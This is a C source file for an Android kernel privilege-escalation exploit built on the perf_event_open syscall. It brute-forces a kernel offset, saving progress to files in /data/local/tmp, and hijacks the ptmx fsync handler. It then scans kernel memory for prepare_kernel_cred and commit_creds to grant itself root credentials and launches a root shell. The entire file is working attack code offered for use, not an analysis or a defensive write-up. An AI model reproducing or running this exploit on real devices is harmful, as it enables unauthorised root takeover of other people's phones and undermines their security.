/*
 * Copyright (C) 2013 Hiroyuki Ikezoe
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#include "perf_event_exploit/perf_event.h"

#ifndef __NR_perf_event_open
#define __NR_perf_event_open   (__NR_SYSCALL_BASE+364)
#endif

#define DATA_TMP_DIR "/data/local/tmp/"
#define WORK_OFFSET_FILE DATA_TMP_DIR "perf_event_exploit-work.offset"
#define LAST_OFFSET_FILE DATA_TMP_DIR "perf_event_exploit-last.offset"
#define OFFSET_FILE      DATA_TMP_DIR "perf_event_exploit.offset"

#define KERNEL_ADDRESS 0xc0008000

static bool
call_ptmx_fsync(void *user_data)
{
  int fd;
  int ret;

  fd = open("/dev/ptmx", O_WRONLY);
  ret = fsync(fd);
  close(fd);

  return (ret == 0);
}

static int
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  int fd;

  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);
  if (fd < 0) {
    fprintf(stderr, "Error %s\n", strerror(errno));
  }

  return fd;
}

struct cred;
struct task_struct;

struct cred *(*prepare_kernel_cred)(struct task_struct *) = NULL;
int (*commit_creds)(struct cred *) = NULL;

int
obtain_root_privilege(void)
{
  unsigned int *address = (int*)KERNEL_ADDRESS;
  int i;

  for (i = 0; i < 0x200000; i++) {
    if (((address[i] & 0xffffff00) == 0xe92d4000 || (address[i] & 0xffff0000) == 0xe59f0000) &&
        address[i + 1] == 0xe3a010d0 &&
        ((address[i + 2] & 0xffffff00) == 0xe92d4000 || (address[i + 2] & 0xffff0000) == 0xe59f0000) &&
        ((address[i + 3] & 0xffff00ff) == 0xe1a00000) &&
        ((address[i + 4] & 0xfff0ffff) == 0xe5900000)) {
      prepare_kernel_cred = (void*)(address + i);
      break;
    }
  }

  if (!prepare_kernel_cred) {
    return 0;
  }

  for (i = 0; i < 0x200000; i++) {
    if ((address[i] & 0xffffff00) == 0xe92d4000 &&
        address[i + 1] == 0xe1a0200d &&
        address[i + 2] == 0xe3c23d7f &&
        address[i + 3] == 0xe1a05000 &&
        address[i + 4] == 0xe3c3303f &&
        (address[i + 5] & 0xfff00000) == 0xe5900000 &&
        (address[i + 6] & 0xfff00000) == 0xe5900000 &&
        (address[i + 7] & 0xfff00000) == 0xe5900000 &&
        (address[i + 8] & 0xfff00000) == 0xe5900000 &&
        (address[i + 9] & 0xfff0ff00) == 0xe1500000) {
      commit_creds = (void*)(address + i);
      break;
    }
  }

  if (!commit_creds) {
    return 0;
  }

  return commit_creds(prepare_kernel_cred(0));
}

static bool
record_offset_to_file(const char *file_name, int offset)
{
  int fd;
  size_t size;
  char buffer[1024];

  fd = open(file_name, O_CREAT|O_WRONLY|O_TRUNC|O_SYNC, 0644);
  if (fd < 0) {
    return false;
  }

  size = snprintf(buffer, sizeof(buffer), "%d", offset);
  if (size != write(fd, buffer, size)) {
    close(fd);
    return false;
  }

  fsync(fd);
  close(fd);

  return true;
}

static bool
record_work_offset(int offset)
{
  return record_offset_to_file(WORK_OFFSET_FILE, offset);
}

static bool
record_last_offset(int offset)
{
  return record_offset_to_file(LAST_OFFSET_FILE, offset);
}

static bool
record_offset(int offset)
{
  return record_offset_to_file(OFFSET_FILE, offset);
}

static int
read_offset_from_file(const char *file_name)
{
  FILE *fp;
  int offset = 1;

  fp = fopen(file_name, "r");
  if (!fp) {
    return -1;
  }

  fscanf(fp, "%d", &offset);
  fclose(fp);

  return offset;
}

static int
read_work_offset(void)
{
  return read_offset_from_file(WORK_OFFSET_FILE);
}

static int
read_last_possible_offset(void)
{
  return read_offset_from_file(LAST_OFFSET_FILE);
}

static int
read_offset(void)
{
  return read_offset_from_file(OFFSET_FILE);
}

static int
search_ptmx_fsync_until_reboot(int offset)
{
  while (true) {
    int fd;
    bool success;

    record_work_offset(offset);

    printf("%d\n", offset);

    fd = syscall_perf_event_open(offset|0x80000000);
    if (fd < 0) {
      printf("This expolit can not be used on this machine\n");
      return fd;
    }

    success = call_ptmx_fsync(NULL);
    close(fd);

    offset++;
  }
  return 0;
}

int
nop(int fd)
{
  return 0;
}

static bool
check_possible_offset(int offset)
{
  record_last_offset(offset);
  printf("writing last offset = %d\n", offset);

  return perf_event_run_exploit_with_offset(offset, (int)&nop, call_ptmx_fsync, NULL);
}

static bool
run_exploit(int offset)
{
  return perf_event_run_exploit_with_offset(offset, (int)&obtain_root_privilege, call_ptmx_fsync, NULL);
}

static int
run_root_shell(int offset)
{
  printf("run root shell\n");
  run_exploit(offset);
  return execl("/system/bin/sh", "/system/bin/sh", NULL);
}

int
main(int argc, char **argv)
{
  int offset = 0;
  int last_offset = 0;
  int work_offset = 0;

  offset = read_offset();

  if (offset > 0) {
    run_root_shell(offset);
    exit(EXIT_SUCCESS);
  }

  work_offset = read_work_offset();
  last_offset = read_last_possible_offset();

  if (work_offset > 0 && last_offset > 0 && work_offset != last_offset) {
    if (check_possible_offset(work_offset)) {
      printf("found! offset = %d\n", work_offset);
      record_offset(work_offset);
      unlink(LAST_OFFSET_FILE);
      return run_root_shell(work_offset);
    }
  }

  work_offset++;
  search_ptmx_fsync_until_reboot(work_offset);
  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
